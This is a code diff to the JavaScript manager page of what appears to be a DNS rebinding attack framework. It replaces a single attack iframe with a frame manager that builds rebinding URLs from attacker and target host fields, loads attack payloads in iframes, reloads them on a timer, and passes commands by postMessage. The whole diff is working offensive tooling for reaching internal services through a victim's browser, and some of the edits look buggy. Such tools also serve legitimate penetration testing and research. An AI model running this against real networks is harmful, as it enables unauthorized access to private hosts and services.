@@ -3,7 +3,6 @@
 // Global state
 let count = 0;
 let errorCount = 0;
-let timerAttackFrameOne;
 let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
 
 // Configuration
@@ -28,18 +27,90 @@ document.onreadystatechange = function () {
             delaydomloadframe.parentNode.removeChild(delaydomloadframe);
         }
     }
+};
+
+const Frame = (id, url)  => {
+    let fmid = id;
+    let fmurl = url;
+    let timer = null;
+    return {
+        getId() {
+            return fmid;
+        },
+        setURL(val) {
+            return url = val;
+        },
+        getURL() {
+            return url;
+        },
+        getTimer() {
+            return timer;
+        },
+        setTimer(val) {
+            return timer = val;
+        }
+    }
+};
+
+const FrameManager = () => {
+    let nextFrameIdVal = 0;
+    let frames = new Map();
+    const nextFrameId = () => {
+        return nextFrameIdVal++;
+    };
+     return {
+         addFrame(url) {
+             frameId = `frame-${nextFrameId().toString()}`;
+             frames.set(frameId, Frame(frameId, url));
+         },
+         removeFrame(frameId) {
+            return frames.delete(frameId);
+         },
+         updateFrame(frameId, url) {
+            frames.set(frameId, Frame(frameId, url));
+         },
+         frames() {
+             return frames;
+         },
+         lastFrameId() {
+             return nextFrameIdVal === 0 ? null : `frame-${nextFrameIdVal - 1}`;
+         },
+         frame(id) {
+             return frames.get(id);
+         }
+     }
+};
+
+let fm = FrameManager();
+
+function addFrameToDOM(frame) {
+    let f = document.createElement("iframe"); 
+    f.src = frame.getURL();
+    f.setAttribute('id', frame.getId());
+    document.getElementById("attackframes").appendChild(f)
 }
 
+// Set src of attackframe
+// thus loading the attack payload before rebinding
+// and accessing the target after rebinding.
+function reloadAttackFrame(frame) {
+    document.getElementById(frame.getId()).src = frame.getURL() + "?rnd=" + Math.random();
+}
+
+
+window.addEventListener("message", receiveMessage, false);
+
 // communication handler between manager and attack iframe.
-window.addEventListener("message", function (msg) {
+function receiveMessage(msg) {
     console.log("Message received from: ", msg.origin, msg.data.status);
 
-    if (msg.origin !== document.getElementById("attackframeone").src.substr(0, msg.origin.length))
+    if (msg.origin !== document.getElementById(fm.lastFrameId()).src.substr(0, msg.origin.length))
         return;
 
     if (msg.data.status == "start") {
         console.log("Iframe reports that attack has started");
-        clearInterval(timerAttackFrameOne);
+        let fid = fm.lastFrameId();
+        clearInterval(fm.frame(fid).getTimer());
         msg.source.postMessage({
             cmd: "interval",
             param: document.getElementById("interval").value
@@ -75,7 +146,8 @@ window.addEventListener("message", function (msg) {
         console.log("error");
 
         if (errorCount == 5) {
-            attackframeone.contentWindow.postMessage({
+            let fid = fm.lastFrameId();
+            fid.contentWindow.postMessage({
                 cmd: "stop"
             }, "*");
             delaydomloadframe.src = "about:blank";
@@ -83,23 +155,10 @@ window.addEventListener("message", function (msg) {
         }
     }
 
+};
 
-});
 
-// Set src of attackframe
-// thus loading the attack payload before rebinding
-// and accessing the target after rebinding.
-function reloadAttackFrameOne() {
-    document.getElementById("attackframeone").src = hosturl
-        .replace("%1", document.getElementById("attackhostipaddress").value)
-        .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
-        .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
-        .replace("%4", document.getElementById("rebindingStrategy").value)
-        .replace("%5", document.getElementById("attackhostdomain").value)
-        .replace("%6", document.getElementById("targetport").value)
-        .replace("%7", document.getElementById("payloads").value) +
-        "?rnd=" + Math.random();
-}
+
 
 // Checks payload exists.
 function checkPayload() {
@@ -118,11 +177,25 @@ function begin() {
         alert("Please select an attack payload first.");
         return;
     }
+
+    fm.addFrame(hosturl
+        .replace("%1", document.getElementById("attackhostipaddress").value)
+        .replace("%2", document.getElementById("targethostipaddress").value.replace(/-/g, '--'))
+        .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
+        .replace("%4", document.getElementById("rebindingStrategy").value)
+        .replace("%5", document.getElementById("attackhostdomain").value)
+        .replace("%6", document.getElementById("targetport").value)
+        .replace("%7", document.getElementById("payloads").value));
+        let fid = fm.lastFrameId();
+        addFrameToDOM(fm.frame(fid));
+
     message.className = "d-block";
     start.disabled = true;
     errorCount = 0;
-    timerAttackFrameOne = setInterval(reloadAttackFrameOne, parseInt(document.getElementById("interval").value) * 1000);
-    reloadAttackFrameOne();
+    fm.frame(fid).setTimer(setInterval((() => {reloadAttackFrame(fm.frame(fid))}), parseInt(document.getElementById("interval").value) * 1000));
+    reloadAttackFrame(fm.frame(fid));
+
+
 }
 
 // Toggles display of advanced settings.
